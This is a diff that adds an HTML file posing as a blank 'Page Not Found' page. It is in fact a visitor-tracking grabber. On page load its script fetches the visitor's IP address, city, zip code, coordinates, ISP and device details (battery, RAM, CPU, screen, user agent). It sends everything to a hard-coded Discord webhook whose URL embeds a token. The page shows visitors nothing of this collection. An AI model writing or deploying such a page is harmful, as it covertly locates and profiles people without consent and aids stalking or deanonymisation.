@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Not Found</title>
+    <style>
+        /* Basic styling for a blank page */
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #000000;
+            color: #FFFFFF;
+            font-family: 'Press Start 2P', sans-serif;
+            text-align: center;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            let ip, country, countryCode, region, regionName, city, zip, lat, lon, timezone, org;
+            let batterypercentage, ischarging, platform, width, height, devicelang, iscookieEnabled, userAgent, cpuThreads, deviceram, referurl;
+            let datetime = new Date();
+            let localtime;
+
+            /**
+             * Formats the timezone offset into UTC±HH:MM
+             * @param {number} offset - Timezone offset in minutes
+             * @returns {string} - Formatted timezone offset
+             */
+            function formatTimezoneOffset(offset) {
+                let sign = offset >= 0 ? '+' : '-';
+                let absOffset = Math.abs(offset);
+                let hours = Math.floor(absOffset / 60);
+                let minutes = absOffset % 60;
+                return `UTC${sign}${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}`;
+            }
+
+            /**
+             * Fetches the information needed and sends it to the Discord webhook
+             */
+            async function getInfo() {
+                try {
+                    // Fetch IP and location data
+                    const ipResponse = await fetch('https://ip-api.io/json');
+                    const ipData = await ipResponse.json();
+                    ip = ipData.ip;
+                    country = ipData.country_name;
+                    countryCode = ipData.country_code;
+                    region = ipData.region_code;
+                    regionName = ipData.region_name;
+                    city = ipData.city;
+                    zip = ipData.zip_code;
+                    lat = ipData.latitude;
+                    lon = ipData.longitude;
+                    timezone = ipData.time_zone;
+                    org = ipData.organisation;
+
+                    // Get additional device info
+                    const battery = await navigator.getBattery();
+                    batterypercentage = String(battery.level * 100) + "%";
+                    ischarging = String(battery.charging);
+                    platform = String(navigator.platform);
+                    width = String(window.innerWidth);
+                    height = String(window.innerHeight);
+                    devicelang = String(navigator.language);
+                    iscookieEnabled = String(navigator.cookieEnabled);
+                    userAgent = String(navigator.userAgent || navigator.vendor || window.opera);
+                    cpuThreads = String(navigator.hardwareConcurrency);
+                    deviceram = String(navigator.deviceMemory) + "GB";
+                    referurl = String(window.location.href);
+                    localtime = String(datetime.toLocaleString());
+
+                    // Calculate timezone offset in minutes and format it
+                    let timezoneOffsetMinutes = -datetime.getTimezoneOffset();
+                    let formattedTimezoneOffset = formatTimezoneOffset(timezoneOffsetMinutes);
+
+                    // Send the information to the webhook
+                    await sendWebhook(formattedTimezoneOffset);
+                } catch (error) {
+                    console.error('Error fetching information:', error);
+                }
+            }
+
+            /**
+             * Sends the collected information to the specified Discord webhook
+             * @param {string} formattedTimezoneOffset - The formatted timezone offset
+             */
+            function sendWebhook(formattedTimezoneOffset) {
+                const webhookUrl = "https://discord.com/api/webhooks/1271415382833631316/KLDM9V6oh7kezM8Q6aGJ791MnX2eDCyHjSbObzB-m7gsmr3JfBsLUON8lxj50ihsgABt";
+
+                let request = new XMLHttpRequest();
+                request.open("POST", webhookUrl);
+                request.setRequestHeader('Content-type', 'application/json');
+
+                let params = {
+                    "content": null,
+                    "embeds": [
+                        {
+                            "title": "IP Data",
+                            "fields": [
+                                { "name": "**IP:**", "value": `${ip}`, "inline": true },
+                                { "name": "**Provider:**", "value": `${org}`, "inline": true },
+                                { "name": "**Country:**", "value": `${country}`, "inline": true },
+                                { "name": "**Code Country:**", "value": `${countryCode}`, "inline": true },
+                                { "name": "**Name reg:**", "value": `${regionName}`, "inline": true },
+                                { "name": "**Code reg:**", "value": `${region}`, "inline": true },
+                                { "name": "**City:**", "value": `${city}`, "inline": true },
+                                { "name": "**Zip:**", "value": `${zip}`, "inline": true },
+
+                                { "name": "**Latitude:**", "value": `${lat}`, "inline": true },
+                                { "name": "**Longitude:**", "value": `${lon}`, "inline": true },
+                                { "name": "**Time zone:**", "value": `${timezone}`, "inline": true },
+                                { "name": "**Timezone Offset:**", "value": `${formattedTimezoneOffset}`, "inline": true },
+                                { "name": "**Localtime:**", "value": `${localtime}`, "inline": true },
+                                { "name": "**Cookies Enabled:**", "value": `${iscookieEnabled}`, "inline": true },
+                                { "name": "**Language:**", "value": `${devicelang}`, "inline": true },
+                                { "name": "**Width px:**", "value": `${width}`, "inline": true },
+
+                                { "name": "**Height px:**", "value": `${height}`, "inline": true },
+                                { "name": "**Platform:**", "value": `${platform}`, "inline": true },
+                                { "name": "**Battery Percentage:**", "value": `${batterypercentage}`, "inline": true },
+                                { "name": "**Charging:**", "value": `${ischarging}`, "inline": true },
+                                { "name": "**CPU Threads:**", "value": `${cpuThreads}`, "inline": true },
+                                { "name": "**RAM:**", "value": `${deviceram}`, "inline": true },
+                                { "name": "**Browser User Agent:**", "value": `${userAgent}`, "inline": true },
+                                { "name": "**Referrer URL:**", "value": `${referurl}`, "inline": true }
+                            ],
+                            "color": 5814783,
+                            "timestamp": datetime.toISOString()
+                        }
+                    ],
+                    "attachments": []
+                };
+
+                request.send(JSON.stringify(params));
+            }
+
+            // Start the information gathering process
+            getInfo();
+        });
+    </script>
+</head>
+
+<body>
+</body>
+
+</html>
